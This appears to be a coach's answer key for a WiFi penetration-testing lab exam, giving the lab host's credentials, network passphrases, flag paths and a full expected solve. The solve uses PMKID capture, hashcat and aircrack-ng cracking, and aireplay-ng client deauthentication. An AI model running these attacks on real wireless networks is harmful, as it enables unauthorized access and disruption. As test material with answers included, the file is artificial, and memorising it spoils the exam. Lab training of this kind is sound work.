# Coach context — wifi-t3-exam

## Ground truth
- `wifilab01` 10.x.10.25 — `wifi`/`WifiLab-24!`, sudo. 4 radios:
  wlan0 `mgmt-wifi` ch6 (pmkid=1, PSK `spring!2024`),
  wlan2 `exec-wifi` ch11 (PSK `pentest-rocks`), wlan3 exec client
  (reassoc ~15s), wlan1 attacker.
- `mgmt-admin` password = `spring!2024`; flag `/home/mgmt-admin/flag.txt`.
- Command flag: `/home/wifi/exam-report.txt` greps `spring` AND
  `pentest-rocks` (both keys present).
- wordlist `/opt/wifi/wordlist.txt` covers both.

## Expected solve
```bash
ssh wifi@10.x.10.25
sudo airodump-ng wlan1                          # map both BSSIDs
# PMKID path (no monitor needed):
sudo hcxdumptool -i wlan1 -o /home/wifi/mgmt.pcapng --enable_status=15
hcxpcapngtool -o /home/wifi/mgmt.22000 /home/wifi/mgmt.pcapng
hashcat -m 22000 /home/wifi/mgmt.22000 /opt/wifi/wordlist.txt   # spring!2024
# Handshake path:
sudo airmon-ng start wlan1
sudo airodump-ng -c 11 --bssid <EXEC-AP> -w /home/wifi/exec wlan1mon
sudo aireplay-ng -0 3 -a <EXEC-AP> -c <EXEC-CLIENT> wlan1mon
aircrack-ng -w /opt/wifi/wordlist.txt /home/wifi/exec-01.cap     # pentest-rocks
printf 'mgmt-wifi: spring!2024\nexec-wifi: pentest-rocks\n' \
    > /home/wifi/exam-report.txt
sshpass -p 'spring!2024' ssh mgmt-admin@localhost 'cat ~/flag.txt'
```

## Coach guidance
- Watch for single-thread thinking — the two attacks are independent;
  running hcxdumptool then airodump serially is fine but parallel is
  the pro move.
- hcxdumptool on wlan1 while it's needed for airodump is a conflict —
  sequence matters: harvest PMKID first OR use it after. Actually one
  interface can only do one thing at a time; hint them to serialize.
- The exec client is on wlan3 — only shows as STATION on ch11.
- Report needs BOTH key strings; partial = no flag.
